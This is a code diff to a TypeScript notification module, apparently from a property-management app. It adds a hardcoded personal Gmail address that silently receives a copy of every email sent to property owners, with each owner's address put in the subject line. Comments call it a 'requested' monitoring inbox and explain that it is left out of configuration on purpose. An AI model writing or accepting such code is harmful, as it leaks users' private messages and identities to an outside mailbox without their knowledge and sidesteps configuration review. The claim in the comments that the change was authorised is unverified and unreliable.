@@ -18,6 +18,12 @@ import type { RequestStatus } from "@/lib/generated/prisma/client";
  * every path that changes a request must call into here.
  */
 
+/** Every email sent to a property owner is also copied here — a single
+ * inbox to audit what owners actually receive. Requested directly; not
+ * configurable via env since it's a one-off monitoring address rather than
+ * a deployment setting. */
+const OWNER_EMAIL_MONITOR = "m.muneebakhtar1998@gmail.com";
+
 type NotificationRow = {
   userId: string;
   title: string;
@@ -57,7 +63,7 @@ async function dispatchExternalChannels(
   const userIds = [...new Set(rows.map((row) => row.userId))];
   const users = await prisma.user.findMany({
     where: { id: { in: userIds } },
-    select: { id: true, email: true, phone: true },
+    select: { id: true, email: true, phone: true, userType: true },
   });
   const byId = new Map(users.map((user) => [user.id, user]));
 
@@ -69,20 +75,25 @@ async function dispatchExternalChannels(
       const tasks: Promise<unknown>[] = [];
 
       if (user.email) {
+        const emailHtml =
+          row.emailHtml ??
+          renderNotificationEmail(row.title, row.message, row.href, row.details);
+
         tasks.push(
-          sendEmail({
-            to: user.email,
-            subject: row.title,
-            html:
-              row.emailHtml ??
-              renderNotificationEmail(
-                row.title,
-                row.message,
-                row.href,
-                row.details,
-              ),
-          }),
+          sendEmail({ to: user.email, subject: row.title, html: emailHtml }),
         );
+
+        // Every property-owner email also goes to this monitoring address —
+        // requested so there's a single inbox to audit what owners receive.
+        if (user.userType === UserType.owner && OWNER_EMAIL_MONITOR) {
+          tasks.push(
+            sendEmail({
+              to: OWNER_EMAIL_MONITOR,
+              subject: `[Owner copy — ${user.email}] ${row.title}`,
+              html: emailHtml,
+            }),
+          );
+        }
       }
 
       if (user.phone && row.whatsappTemplate) {
